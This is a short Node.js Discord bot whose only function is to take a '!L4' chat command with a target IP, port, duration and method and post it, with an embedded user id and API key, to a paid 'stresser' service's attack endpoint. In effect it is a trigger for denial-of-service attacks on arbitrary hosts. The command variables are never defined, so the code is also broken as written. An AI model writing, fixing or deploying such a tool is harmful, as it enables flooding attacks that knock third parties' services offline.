const ms = require('ms')
const fetch = require('node-fetch')
const axios = require('axios')
const Discord = require('discord.js')
const client = new Discord.Client()
const config = require('./config.json')
const { MessageButton, MessageActionRow } = require('discord-buttons')
const disbut = require('discord-buttons');
disbut(client);

client.once('ready', () => {
    console.log('Lets Fucking GO!');
});

client.on('message', async (message) => {

    if(message.content.startsWith(`!L4 ${alvo} ${porta} ${tempo} ${metodo}`)){
        axios.post(`http://zdstresser.net/panel/apiv1/?userid=16410&key=74YB7-97327-RKBLS&command=post.attack&type=ip4&target=${alvo}&port=${porta}&time=${tempo}&method=id::${metodo}`).then(function(resposta){
            console.log(resposta.data);
        });
    }

});

client.login(config.token)
